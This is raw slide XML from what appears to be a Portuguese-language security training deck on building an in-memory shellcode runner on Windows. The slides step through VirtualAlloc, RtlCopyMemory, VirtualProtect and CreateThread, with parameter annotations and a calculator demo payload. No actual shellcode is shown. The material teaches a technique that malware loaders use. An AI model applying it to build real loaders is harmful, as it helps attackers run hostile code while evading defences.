          <a:xfrm>
            <a:off x="5125018" y="1898596"/>
            <a:ext cx="6849267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1800" noProof="0" dirty="0"/>
              <a:t>1. Alocar espaço na memória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2. Garantir que temos permissão de escrita nesse espaço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3. Copiar para a memória o código a ser executado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4. Garantir que o espaço tem permissão de execução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5. Executar o código em memória</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" sz="1800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31E10-51B4-8E59-AD31-FC7AB2C79965}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9364785" y="2895600"/>
            <a:ext cx="987529" cy="34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7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838C1-89AF-9085-0AE2-A72B06F1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4B737B-09BF-938E-3C5D-4F7E267A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82E8BF-17D2-09E7-823D-B8E859DEB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46"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-4251188" y="10"/>
            <a:ext cx="9669642" cy="6857990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:glow>
              <a:schemeClr val="tx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15C1015-497C-3E2D-97E6-C62878FA1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E459B1-D726-6553-0A23-00D78C5F0026}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5542596" y="354239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Do it Yourself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CB225C-8170-0C43-752F-9CA4C2315F23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5125018" y="1898596"/>
            <a:ext cx="6849267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1800" noProof="0" dirty="0"/>
              <a:t>1. Alocar espaço na memória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2. Garantir que temos permissão de escrita nesse espaço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3. Copiar para a memória o código a ser executado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RtlCopyMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1"/>
              <a:t>(Destino</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, Conteudo, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" i="1" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tamanho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4. Garantir que o espaço tem permissão de execução</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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5. Executar o código em memória</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" sz="1800" b="1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459A3-04AE-B52D-9796-6B151C6FA49B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8472157" y="3548743"/>
            <a:ext cx="987529" cy="34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8B0EB-48B7-D841-358D-BD22F30EB016}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9580088" y="4700538"/>
            <a:ext cx="192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ser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" noProof="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>executado</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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20061A-306D-1A2D-8900-628DCCF62B53}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="9459686" y="3722914"/>
            <a:ext cx="1077685" cy="968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01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6DF56-6E35-06EF-37D9-5ED3524C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C28C75-BD31-03ED-21BE-D28CD7DD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619A75-3B40-6F6F-3733-C8C58C761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46"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-4251188" y="10"/>
            <a:ext cx="9669642" cy="6857990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:glow>
              <a:schemeClr val="tx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3D868E6-9EF2-06B3-D56A-842AE5600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E9161-EDC3-F9B2-6F0B-DD92B2754E38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5542596" y="354239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Do it Yourself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EED091-AC61-77A0-1310-1F3B4A280972}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5125018" y="1898596"/>
            <a:ext cx="6849267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1800" noProof="0" dirty="0"/>
              <a:t>1. Alocar espaço na memória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2. Garantir que temos permissão de escrita nesse espaço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3. Copiar para a memória o código a ser executado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RtlCopyMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1"/>
              <a:t>(Destino</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, Conteudo, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" i="1" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tamanho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4. Garantir que o espaço tem permissão de execução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VirtualProtect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noProof="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nova Permissao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/>
              <a:t>Onde guardar a permissao antiga)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5. Executar o código em memória</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-B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185883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B1196-1585-28FD-12A8-7F121C6A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4C0EE7-5D17-DEB4-4130-BD7ECBA5B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5B732-86D3-218C-2E07-38BF6E9C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46"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-4251188" y="10"/>
            <a:ext cx="9669642" cy="6857990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:glow>
              <a:schemeClr val="tx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C1499F4-DEE1-AFE6-4A51-B55158A6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BA631A8-1FED-AF21-A076-1FE610BEC4A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5542596" y="354239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Do it Yourself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E6AE72-01F1-CC55-90B1-AB937669577A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5125018" y="1898596"/>
            <a:ext cx="6849267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buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
              <a:t>1. Alocar espaço na memória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2. Garantir que temos permissão de escrita nesse espaço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VirtualAlloc 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i="1" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tipo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AFBF7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Permissao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3. Copiar para a memória o código a ser executado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RtlCopyMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1"/>
              <a:t>(Destino</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, Conteudo, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" i="1" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tamanho</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1"/>
              <a:t>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4. Garantir que o espaço tem permissão de execução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VirtualProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1"/>
              <a:t>(Local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, Tamanho, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nova Permissao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/>
              <a:t>Onde guardar a permissao antiga)</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="1800" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
              <a:t>5. Executar o código em memória</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CreateThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Atributos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6897BB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tamanho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/>
              <a:t>Onde inicia o codigo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, Parametros, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Flags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ID da Thread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="1800" noProof="1"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="pt-B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49202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50DC9-7C87-8D5A-D36A-4C6C0FE6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DE76A2-712F-81C6-1108-914BC6AE5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1" b="6235"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1349825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8B5E953-7667-7F11-383A-43B28D551729}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8658508" y="0"/>
            <a:ext cx="3301263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pt-BR" b="1" noProof="0" dirty="0"/>
              <a:t>Construindo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="110462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18625-0243-ACB1-98C9-D1247AFE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AFF7A2-4BB3-4C22-FEF1-01B69D3FA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03B035-9942-9110-D8D4-A2A36D19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A57791-939B-AFC2-8CD8-4426FEF6077A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</a:t>
            </a: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thread, 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}</a:t>
            </a:r>
            <a:endParaRPr lang="en-CA" sz="1800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223DE8-E41A-D01A-134C-3A9A3A180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4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61F0D-64DA-E54B-4128-571FAFD3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5286FB-6F8E-9C79-1614-EFF71D0E9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B8ABE4-465C-6326-BCA0-35BFF26E7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884FA3-8EBB-BA60-4EC5-AE4919D80F0B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thread, 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496976-E9D4-9161-951B-4199FACC2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21D3D4-93F4-4899-E20D-4C725E642446}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5716224" y="436211"/>
            <a:ext cx="5582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Local -&gt; 0 = Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pode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escolher</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> um local </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>na</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> memoria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12509-4ABD-0B7A-86F0-6A3B03C5CDC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8507661" y="586372"/>
            <a:ext cx="344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Tamanho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Tamanho</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> da string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>que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tem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>codigo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> da </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>calculadora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40FC4-B555-D071-EBDF-E776657EE6CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10160437" y="1564702"/>
            <a:ext cx="1781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>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tipo = Reserve e </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" noProof="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>preencha com 0s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81EAB-7A87-7D7B-DEAE-AA7D5C12606D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10231318" y="2055834"/>
            <a:ext cx="114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Permissao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47006-8055-6F1D-AEA6-84A49C897CDC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5781540" y="1321831"/>
            <a:ext cx="987529" cy="34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C0F2B6-7642-5F14-F402-D08CADE13D7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="3" idx="2"/>
            <a:endCxn id="8" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6769069" y="805543"/>
            <a:ext cx="1738593" cy="69046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2C48D-1219-CA4A-7827-8DEB0A8A0F8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5808588" y="1615734"/>
            <a:ext cx="2246841" cy="2177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1BEF0C-B3C8-BB06-41EA-F2D7FFA9B05B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="4" idx="2"/>
            <a:endCxn id="13" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="8055429" y="1232703"/>
            <a:ext cx="2175890" cy="49188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B7773E7-813D-1982-FA8D-792D1053D9FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5805542" y="1838119"/>
            <a:ext cx="2979229" cy="2177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38E86C-4C1C-E13C-FDAD-8B7D8108A08D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="5" idx="1"/>
            <a:endCxn id="18" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="8784771" y="1887868"/>
            <a:ext cx="1375666" cy="5910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3DD43C7-78B2-6837-3C41-EE5F39D32137}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5805542" y="2055834"/>
            <a:ext cx="2358744" cy="2177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73592C-D388-9911-46ED-4A99EE28E6C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="7" idx="1"/>
            <a:endCxn id="24" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="8164286" y="2164692"/>
            <a:ext cx="2067032" cy="758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5FEF2EC-CFAA-C859-731E-ACE3E3AB3FEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5543875" y="37965"/>
            <a:ext cx="66450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noProof="1"/>
              <a:t>1, 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>VirtualAlloc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>(Local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Tamanho, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" i="1" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tipo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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Permissao</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR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1943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  <p:bldP spid="8" grpId="0" animBg="1"/>
      <p:bldP spid="8" grpId="1" animBg="1"/>
      <p:bldP spid="13" grpId="0" animBg="1"/>
      <p:bldP spid="13" grpId="1" animBg="1"/>
      <p:bldP spid="18" grpId="0" animBg="1"/>
      <p:bldP spid="18" grpId="1" animBg="1"/>
      <p:bldP spid="24" grpId="0" animBg="1"/>
      <p:bldP spid="2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CAE44-2C85-750F-F873-5BC685CD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E2A512-5EFD-64D6-F47A-3653A7EB3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5795B3-B340-BC22-AD5B-317F24F2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C3D2B2-C1B2-2BBB-3453-53BC2A697732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thread, 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62B1F5-04C5-C409-8635-A49F50DE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EACB78-585F-4B06-E653-EE1ED8CF9D77}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5543875" y="37965"/>
            <a:ext cx="66481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noProof="1"/>
              <a:t>3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>RtlCopyMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>(Destino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Conteudo, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" i="1" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tamanho</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" b="1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55502-F42C-A2C5-D716-7EADA0EAB125}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5805157" y="2754085"/>
            <a:ext cx="1194357" cy="272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FF8C-CFA4-3424-A475-93167A7EBC47}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281717" y="457982"/>
            <a:ext cx="192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Para </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onde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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>copiar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ED1E53-0D7F-0858-E6D1-4F13E67D7375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402336" y="827314"/>
            <a:ext cx="0" cy="192677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A2034E-D24E-B374-A898-82441FCE9F98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5805157" y="2983465"/>
            <a:ext cx="3654529" cy="272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5E995D-FFB3-D52A-0CFF-69473606C980}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6669035" y="767969"/>
            <a:ext cx="192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O </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>que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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>copiar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2AAAA7-C30D-24CF-316B-00DBDDC388DF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632421" y="1137301"/>
            <a:ext cx="1" cy="184616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760FBDE-7123-6A99-10EF-3338C7DCBCE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5805158" y="3218816"/>
            <a:ext cx="2250272" cy="272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D0E9D9-F918-21C1-A792-A72343E0A5BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7843925" y="1019902"/>
            <a:ext cx="192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Quanto </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>copiar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4E12BF-B369-558E-4696-E7432F3BDEE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:endCxn id="17" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8055429" y="1372652"/>
            <a:ext cx="1" cy="19822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34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12" grpId="0" animBg="1"/>
      <p:bldP spid="12" grpId="1" animBg="1"/>
      <p:bldP spid="13" grpId="0"/>
      <p:bldP spid="13" grpId="1"/>
      <p:bldP spid="17" grpId="0" animBg="1"/>
      <p:bldP spid="17" grpId="1" animBg="1"/>
      <p:bldP spid="18" grpId="0"/>
      <p:bldP spid="1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D4259-6306-8E6F-7B32-59F8C4FA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F40AF81-8335-C8F6-8877-111F066B9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798F0C-27D0-BDCF-5187-845715C0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4F5D5E-21F5-BE0F-6197-4D1F250C5D42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thread, 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AD56F-BFA4-3DE2-82C9-54FC0A4F744D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5630963" y="37965"/>
            <a:ext cx="66372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noProof="1"/>
              <a:t>4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>VirtualProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>(Local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Tamanho, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Nova Permissao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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" noProof="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>permissao antiga)</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" b="1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5CF503-0ACB-CBF1-99C1-415C64D69A5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
